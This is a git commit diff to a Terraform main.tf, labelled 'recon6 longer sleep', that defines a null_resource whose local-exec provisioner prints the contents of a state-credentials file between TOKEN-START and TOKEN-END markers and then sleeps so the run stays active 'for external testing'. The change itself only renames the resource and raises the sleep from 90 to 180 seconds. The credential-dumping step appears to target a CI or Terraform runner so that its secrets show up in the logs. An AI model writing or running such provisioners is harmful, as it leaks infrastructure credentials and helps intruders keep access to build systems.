d84dc5d89a525ca953bcf2386a7b35a45fa16226
test <test@test.local>
2026-07-23 05:11:17 +0530

    recon6 longer sleep

--- main.tf
+++ main.tf
@@ -6,15 +6,15 @@ terraform {
   }
 }
 
-resource "null_resource" "recon5" {
+resource "null_resource" "recon6" {
   provisioner "local-exec" {
     command = <<-EOT
       echo "=== TOKEN-START ==="
       cat /mnt/workspace/source/state-credentials.tf 2>&1
       echo "=== TOKEN-END ==="
-      echo "=== sleeping 90s to stay active for external testing ==="
-      sleep 90
-      echo "=== DONE5 ==="
+      echo "=== sleeping 180s to stay active for external testing ==="
+      sleep 180
+      echo "=== DONE6 ==="
     EOT
   }
 }
